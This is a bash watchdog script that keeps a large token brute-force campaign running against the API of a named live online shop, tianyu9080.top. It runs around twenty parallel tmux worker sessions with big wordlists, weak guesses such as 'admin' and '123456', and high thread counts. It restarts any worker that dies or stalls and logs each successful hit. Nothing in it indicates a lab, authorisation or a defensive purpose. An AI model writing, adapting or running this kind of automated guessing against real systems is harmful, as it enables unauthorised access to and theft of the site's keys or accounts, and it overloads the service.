#!/bin/bash
OUT=/data/automation/results/tianyu9080.top/kami_attack_20260718
BIN=/data/automation/bin
WL=/data/wordlists/faka/faka-tokens.txt
PRI=/data/wordlists/faka/tianyu9080-priority.txt
HEX=/data/wordlists/faka/tianyu9080-hex32-sample.txt
HITS="$OUT/KAMI_HIT.jsonl"
LOG="$OUT/watchdog.log"
WORKERS="${WORKERS:-20}"
CHUNK=1472636
THREADS="${THREADS:-60}"
PRI_THREADS="${PRI_THREADS:-80}"
FAKA_BASE="${FAKA_BASE:-https://tianyu9080.top/shop/}"
FAKA_QUICK="${FAKA_QUICK:-tianyu,tianyu9080,TIANYU9080,天鱼,ty9080,admin,123456,api,test,secret}"
LAST=0

restart_worker() {
  local w=$1 start=$2 chunk=$3 threads=$4 wl=$5
  tmux kill-session -t "ty-api-$w" 2>/dev/null || true
  tmux new-session -d -s "ty-api-$w" \
    "FAKA_BASE=$FAKA_BASE FAKA_OUT=$OUT FAKA_DIRECT=1 FAKA_QUICK=$FAKA_QUICK FFFZZ_TURBO=1 FFFZZ_TIMEOUT=3 FAKA_FAST_KEY=1 FAKA_BATCH=8000 python3 $BIN/faka_api_brute_fast.py $wl $start $chunk $threads $w $OUT 2>&1 | tee -a $OUT/api_w${w}.log"
}

while true; do
  TS=$(date '+%H:%M:%S')
  N=$(wc -l < "$HITS" 2>/dev/null || echo 0)
  RATES=$(grep -h "rate=" "$OUT"/api_brute_w*.log "$OUT"/priority.log "$OUT"/hex32.log 2>/dev/null | tail -4)
  CURLS=$(pgrep -c curl 2>/dev/null || echo 0)
  echo "[$TS] hits=$N curls=$CURLS" >> "$LOG"
  if [ -n "$RATES" ]; then echo "[$TS] $RATES" >> "$LOG"; fi
  if [ "$N" -gt "$LAST" ]; then
    echo "[$TS] *** NEW HIT ***" >> "$LOG"
    tail -1 "$HITS" >> "$LOG"
    LAST=$N
  fi
  for w in $(seq 0 $((WORKERS - 1))); do
    if ! tmux has-session -t "ty-api-$w" 2>/dev/null; then
      echo "[$TS] restart w$w (dead)" >> "$LOG"
      restart_worker "$w" "$((w * CHUNK))" "$CHUNK" "$THREADS" "$WL"
    elif grep -q "site down" "$OUT/api_brute_w${w}.log" 2>/dev/null && \
         ! grep -q "FAST brute" "$OUT/api_brute_w${w}.log" 2>/dev/null; then
      echo "[$TS] restart w$w (stuck)" >> "$LOG"
      restart_worker "$w" "$((w * CHUNK))" "$CHUNK" "$THREADS" "$WL"
    fi
  done
  for pair in "priority:99:$PRI:0:0:$PRI_THREADS" "hex32:98:$HEX:0:0:$PRI_THREADS"; do
    IFS=: read -r name wid wl start chunk threads <<< "$pair"
    if ! tmux has-session -t "ty-$name" 2>/dev/null; then
      echo "[$TS] restart $name" >> "$LOG"
      tmux new-session -d -s "ty-$name" \
        "FAKA_BASE=$FAKA_BASE FAKA_OUT=$OUT FAKA_DIRECT=1 FAKA_QUICK=$FAKA_QUICK FFFZZ_TURBO=1 FFFZZ_TIMEOUT=3 FAKA_FAST_KEY=1 FAKA_BATCH=8000 python3 $BIN/faka_api_brute_fast.py $wl $start $chunk $threads $wid $OUT 2>&1 | tee -a $OUT/${name}.log"
    fi
  done
  sleep 90
done
